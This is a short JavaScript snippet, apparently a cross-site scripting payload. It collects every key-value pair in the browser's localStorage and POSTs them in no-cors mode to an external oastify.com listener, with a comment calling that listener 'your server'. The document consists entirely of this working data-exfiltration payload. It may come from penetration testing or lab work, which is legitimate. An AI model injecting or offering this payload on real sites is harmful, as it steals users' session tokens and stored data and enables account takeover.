// Extract all localStorage key-value pairs
let data = '';
for (let i = 0; i < localStorage.length; i++) {
  let key = localStorage.key(i);
  let value = localStorage.getItem(key);
  data += `${key}=${value};`;
}

// Send it to your server
fetch('https://bu9gnoj277qgo40abcbx7i6aj1psdl1a.oastify.com/ls', {
  method: 'POST',
  mode: 'no-cors',
  body: data
});
